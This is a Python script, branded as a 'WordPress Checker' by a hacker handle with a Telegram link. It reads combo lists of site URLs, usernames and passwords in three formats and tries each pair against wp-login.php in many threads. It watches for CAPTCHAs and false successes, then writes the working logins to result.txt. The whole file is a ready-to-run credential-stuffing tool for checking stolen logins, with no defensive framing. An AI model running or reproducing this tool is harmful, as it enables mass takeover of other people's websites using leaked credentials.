import requests
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, init

# Initialize colorama for automatic color settings
init(autoreset=True)

# Color settings for output
fc = Fore.CYAN    # Cyan for URLs
fy = Fore.YELLOW  # Yellow for information and processes
fr = Fore.RED     # Red for failures
fg = Fore.GREEN   # Green for success
red = '\033[91m'
cyan = '\033[96m'
reset = '\033[0m'  # Reset warna

# Function to log in to WordPress
def login_to_wordpress(url, username, password):
    login_url = f"{url}/wp-login.php"  # URL for the WordPress login page
    login_data = {
        'log': username,
        'pwd': password
    }
    try:
        # Send a POST request with a session to follow redirects
        session = requests.Session()
        response = session.post(login_url, data=login_data, timeout=10, allow_redirects=True)

        # Debug: Display the redirect URL and page content
        print(f"{fy}[DEBUG] Redirect URL: {response.url}")
        print(f"{fy}[DEBUG] Page Content Preview: {response.text[:200]}...")  # Display the first 200 characters

        # Check if the response is empty
        if not response.text.strip():
            print(f"{fr}[!] Empty page received from {url}")
            return False

        # Check if CAPTCHA is detected
        if "CAPTCHA" in response.text or "Please verify" in response.text:
            print(f"{fr}[!] CAPTCHA detected on {url}")
            return False

        # Validate successful login based on content
        if 'Dashboard' in response.text or '<title>Dashboard</title>' in response.text:
            print(f"{fg}[DEBUG] Successful login: Dashboard detected")
            return True  # Successfully logged in to the dashboard
        elif '/wp-admin' in response.url:
            # Check if the page contains fake login elements
            if 'wp-login' in response.url or 'Invalid login' in response.text or 'login' in response.text.lower():
                print(f"{fr}[DEBUG] Fake login: Page redirected to re-login")
                return False  # Fake login detected
            print(f"{fg}[DEBUG] Successful login: Logged in to wp-admin without dashboard validation")
            return True  # Successfully logged in to wp-admin without dashboard validation
        else:
            print(f"{fr}[DEBUG] Login failed: No login success indicators")
            return False  # Login failed
    except requests.exceptions.RequestException as e:
        print(f'{fr}[!] Error while trying to log in to {url}: {e}')
        return None

# Function to handle login checks based on different separator formats
def check_wordpress_logins(file_path, max_threads, separator_choice):
    processed_urls = set()  # To track processed URLs

    try:
        with open(file_path, 'r') as file:
            lines = file.readlines()

        # Function to process each line in the file
        def process_line(line):
            if line.strip() in processed_urls:
                return  # Skip if already processed

            processed_urls.add(line.strip())

            # Handle different formats based on the chosen separator
            if separator_choice == '1':
                try:
                    # Split URL at '://' and process the parts
                    url_part, remainder = line.strip().split('://', 1)
                    url = f"{url_part}://{remainder.split(':', 1)[0]}"  # Build the full URL
                    remainder = remainder.split(':', 1)[1]  # Get the rest (username:password)
                    username, password = remainder.split(':', 1)  # Split username and password
                except ValueError:
                    print(f'{fr}[!] Invalid line format: {line.strip()}')
                    return
            elif separator_choice == '2':
                try:
                    url, username, password = line.strip().split('|', 2)
                except ValueError:
                    print(f'{fr}[!] Invalid line format: {line.strip()}')
                    return
            elif separator_choice == '3':
                try:
                    url, username = line.strip().split('#', 1)
                    username, password = username.split('@', 1)
                except ValueError:
                    print(f'{fr}[!] Invalid line format: {line.strip()}')
                    return
            else:
                print(f'{fr}[!] Invalid separator choice.')
                return

            # Debug: Display parsed credentials
            print(f'{fc}[DEBUG] URL: {url}, Username: {username}, Password: {password}')

            # Check login
            print(f'{fy}[INFO] Trying to log in to {url} with username {username}')
            login_success = login_to_wordpress(url, username, password)

            if login_success is True:
                print(f'{fg}[+] Successful login to {url}|{username}|{password}')
                with open('result.txt', 'a') as result_file:
                    result_file.write(f'{url}|{username}|{password}\n')
            elif login_success is False:
                print(f'{fr}[-] Failed login to {url}#{username}@{password}')
            else:
                print(f'{fr}[!] Unable to connect to {url}')

        # Run multithreading for each line
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            executor.map(process_line, lines)

    except FileNotFoundError:
        print(f'{fr}[!] File {file_path} not found.')
    except Exception as e:
        print(f'{fr}[!] Error reading file: {e}')

# Menu for tool usage
print(f'{red}========================================== {reset}')
print(f'{red}====                                  ==== {reset}')
print(f'{red}==== WordPress Checker By Z-BL4CK-H4T ==== {reset}')
print(f'{red}====       https://t.me/ZBLACX        ==== {reset}')
print(f'{red}====                                  ==== {reset}')
print(f'{red}========================================== {reset}')
file_path = input(f'{fy}Enter the txt file path: ')
max_threads = int(input(f'{fg}Enter the maximum number of threads (e.g., 10): '))

# Choose separator once and use it for the entire file
print(f'''
{cyan}Choose separator for login credentials in this file:
1. Separator ":"   (https://example.com:username:password)
2. Separator "|"   (https://example.com|username|password)
3. Separator "#,@" (https://example.com#username@password){reset}
''')
separator_choice = input(f'{fy}Enter your choice (1, 2, or 3): ')

check_wordpress_logins(file_path, max_threads, separator_choice)
print(f'{fg}Process finished, successful logins saved to result.txt')
